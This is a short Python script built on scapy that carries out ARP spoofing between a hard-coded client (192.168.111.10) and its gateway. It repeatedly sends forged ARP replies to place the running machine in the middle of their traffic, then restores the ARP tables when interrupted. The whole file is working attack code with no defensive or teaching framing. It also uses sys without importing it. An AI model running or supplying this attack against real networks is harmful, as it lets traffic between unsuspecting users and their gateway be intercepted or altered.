import time
import scapy.all as scapy

# MY_IP = '192.168.111.'
# SERVER_IP = '192.168.111.2'
TARGET_CLIENT_IP = '192.168.111.10'
GATEWAY_IP = '192.168.111.1'


def getMAC(targetip):
	arppacket= scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(op=1, pdst=targetip)
	targetmac= scapy.srp(arppacket, timeout=2 , verbose= False)[0][0][1].hwsrc
	return targetmac


def spoof(targetIP, spoofIP, dstMAC):
    pkt = scapy.ARP(
        op=2,
        pdst=targetIP,
        hwdst=dstMAC,
        psrc=spoofIP
    )
    scapy.send(pkt, verbose=False)


def restore(dstIP, srcIP, dstMAC, srcMAC):

    pkt = scapy.ARP(
        op=2,
        pdst=dstIP,
        hwdst=dstMAC,
        psrc=srcIP,
        hwsrc=srcMAC
    )
    scapy.send(pkt, count=4, verbose=False)


def main():
    targetClientMAC = getMAC(TARGET_CLIENT_IP)
    gatewayMAC = getMAC(GATEWAY_IP)

    try:
        while True:
            spoof(
                targetIP=TARGET_CLIENT_IP,
                spoofIP=GATEWAY_IP,
                dstMAC=targetClientMAC
            )
            spoof(
                targetIP=GATEWAY_IP,
                spoofIP=TARGET_CLIENT_IP,
                dstMAC=gatewayMAC
            )
            sys.stdout.flush()
            time.sleep(2)
    except KeyboardInterrupt:
        restore(
            dstIP=TARGET_CLIENT_IP,
            srcIP=GATEWAY_IP,
            dstMAC=targetClientMAC,
            srcMAC=gatewayMAC
        )
        restore(
            dstIP=GATEWAY_IP,
            srcIP=TARGET_CLIENT_IP,
            dstMAC=gatewayMAC,
            srcMAC=targetClientMAC
        )


if __name__ == '__main__':
    main()
